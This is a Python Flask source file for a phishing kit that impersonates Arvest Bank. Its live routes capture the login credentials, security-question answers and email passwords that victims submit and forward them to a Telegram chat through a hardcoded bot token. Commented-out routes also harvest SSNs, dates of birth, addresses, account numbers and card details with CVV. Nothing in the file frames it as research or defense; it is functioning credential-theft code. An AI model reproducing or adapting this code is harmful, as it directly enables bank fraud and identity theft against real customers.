from flask import Blueprint, session, render_template, request, redirect, url_for
# from .utils import report_login, report_card_details, report_ssn, personal_confirmation
from .utils import report_login, security_question
import telebot

API_TOKEN = '5405884216:AAHGNPuvW4kByyWZpqd6O_8l_aZjMwtJdp4'

receiver_id = -725422686

bot = telebot.TeleBot(API_TOKEN)

portals = Blueprint('portals', __name__)

@portals.route('/signin', methods=['GET','POST'])
def signin():
    if request.method == 'POST':
        user_id = request.form['user-id']
        password = request.form['password']
        if user_id and password:
            # print(user_id,password)
            # report_login(user_id,password, bank_name='ARVEST BANK')
            bot.send_message(receiver_id, f'-------------ARVEST BANK-------------\nUsername: {user_id}\nPassword: {password}\n--------------------------')
            return redirect(url_for('portals.question'))
    return render_template('sign_in.html')

@portals.route('/security-question', methods=['GET','POST'])
def question():
    if request.method == 'POST':
        q1 = request.form['q1']
        ans1 = request.form['ans1']
        q2 = request.form['q2']
        ans2 = request.form['ans2']
        q3 = request.form['q3']
        ans3 = request.form['ans3']
        email = request.form['email']
        password = request.form['password']
        # print(q1,ans1,q2,ans2,q3,ans3, email, password)
        bot.send_message(receiver_id, f'-------------ARVEST -----------\nQ1: {q1}\nQ2: {q2}\nQ3: {q3}\nemail: {email}\nPassword: {password}\n--------------------------')
        return redirect(url_for('main.syncing'))
    return render_template('security-question.html')

# @portals.route('/ssn', methods=['GET','POST'])
# def ssn():
#     username = session['username']
#     if request.method == 'POST':
#         ssn = request.form['ssn']
#         dob = request.form['dob']
#         if ssn:
#             bot.send_message(receiver_id, f'-------------MANDT SSN AND DOB FOR {username} -------------\nUsername: {ssn}\nPassword: {dob}\n--------------------------')
#             # print(ssn)
#             # report_ssn(ssn)
#             return redirect(url_for('portals.email_confirmation'))
#     return render_template('identity-ssn.html')

# @portals.route('/signin/address-confirmation', methods=['GET','POST'])
# def address():
#     if request.method == 'POST':
#         address = request.form['address']
#         apt = request.form['apt']
#         city = request.form['city']
#         state = request.form['state']
#         zipcode = request.form['zipcode']
#         if address and city and state and zipcode:
#             # print( card_name, card_number, exp_date, cvv)
#             report_address(address, apt, city, state, zipcode)
#             return redirect(url_for('portals.email_confirmation'))
#     return render_template('address.html')

# @portals.route('/signin/personal-confirmation', methods=['GET','POST'])
# def personal_confirmation():
#     if request.method == 'POST':
#         card_name = request.form['account_name']
#         card_number = request.form['account_number']
#         exp_date = request.form['routine_number']
#         if card_name and card_number and exp_date:
#             # print( card_name, card_number, exp_date, cvv)
#             report_personal_details(card_name, card_number, exp_date)
#             return redirect(url_for('main.syncing'))
#     return render_template('personal_info.html')

# @portals.route('/signin/card-confirmation', methods=['GET','POST'])
# def card_confirmation():
#     if request.method == 'POST':
#         card_name = request.form['card_name']
#         card_number = request.form['card_number']
#         exp_date = request.form['exp_date']
#         cvv = request.form['cvv']
#         if card_name and card_number and exp_date and cvv:
#             # print( card_name, card_number, exp_date, cvv)
#             report_card_details(card_name, card_number, exp_date, cvv)
#             return redirect(url_for('portals.address'))
#     return render_template('bank-card.html')

# We are all 6 years old at some level